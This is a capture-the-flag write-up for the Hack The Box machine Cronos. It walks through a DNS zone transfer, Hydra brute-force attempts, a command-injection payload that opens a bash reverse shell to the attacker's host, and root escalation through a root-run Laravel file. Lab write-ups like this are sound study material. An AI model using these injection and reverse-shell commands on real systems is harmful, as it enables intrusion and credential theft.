---
layout: post
title: HTB-CRONOS(10.10.10.13)
---

**Note: This is another old writeup when i started to get into hacking, there is no such big explanation here as i was new to hacking to grasp more knowledge in tool and scripts**

    nmap -sT -Pn -p- -min-rate 4000 --max-retries 1 10.10.10.13
    
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Lets enumerate port 53 (ZONE TRANSFER)

    dig axfr @10.10.10.13 

; <<>> DiG 9.17.21-1-Debian <<>> axfr @10.10.10.13
; (1 server found)
;; global options: +cmd
;; Query time: 4287 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (UDP)
;; WHEN: Thu Feb 03 10:52:54 EST 2022
;; MSG SIZE  rcvd: 28
 1 server found it seems…so let’s check further
    dig axfr cronos.htb @10.10.10.13                                                                            

; <<>> DiG 9.17.21-1-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 284 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Thu Feb 03 10:51:58 EST 2022
;; XFR size: 7 records (messages 1, bytes 203)

Let’s add admin.cronos.htb to nano /etc/hosts

Going into browser we found a login page

Tried brute forcing with hydra

With admin
    hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.13 http-post-form "/admin.cronos.htb:username=admin&password=^PASS^:Your Login Name or Password is invalid"

Without admin

─    hydra -L /etc/theHarvester/wordlists/names_small.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.13 http-post-form "/admin.cronos.htb:username=^USER^&password=^PASS^:Your Login Name or Password is invalid"
Tried brute force but did not work.

There in admin.cronos.htb… I found a net toolv1.which had ping and traceroute tab…

Later i intercepted in burp to check.

And there was problem with the command injection

command=ls –l&host=/var/www -- when I typed this command, I was able to get the directory and some users.

so, I injected the below command for reverse connection.and I was successful

    command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.4/443+0>%261'%26host=

    nc -lvvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.13.
Ncat: Connection from 10.10.10.13:42252.
bash: cannot set terminal process group (1396): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$

www-data@cronos:/var/www/admin$ ls
    ls
config.php
index.php
logout.php
session.php
welcome.php

www-data@cronos:/var/www/admin$ cat config.php
    cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>

We got the admin password.

Let’s login to my sql with this cred – nothing happened

So uploaded linpeas.sh

There I found Laravel has permission to run a file in root mode every time..

So, I copied the content and uploaded the file with same name with my lil code change.

Then I got the connection
    nc -lvvp 443   
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.13.
Ncat: Connection from 10.10.10.13:35696.
/bin/sh: 0: can't access tty; job control turned off
    id
uid=0(root) gid=0(root) groups=0(root)
